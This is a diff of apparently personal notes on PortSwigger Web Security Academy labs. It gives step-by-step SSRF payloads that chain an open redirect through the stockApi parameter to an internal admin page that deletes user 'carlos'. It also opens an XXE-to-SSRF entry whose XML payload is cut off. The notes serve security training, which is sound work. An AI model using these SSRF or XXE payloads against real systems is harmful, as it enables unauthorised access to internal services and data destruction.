@@ -34,8 +34,8 @@ solution:
     step-2: paste open redirect into stockApi parameter, 'stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/'
     step-3: append portion response containing href to delete carlos onto string from step-2 ('stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos&')
 
-[lab: ]
-url:
+[lab: Exploiting XXE to perform SSRF attacks]
+url: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
 solution: for this lab, you have to keep appending the directory returned in the result to the url in the entity definition. the xml paylpad should look like the following
 
     <?xml version="1.0" encoding="UTF-8"?>
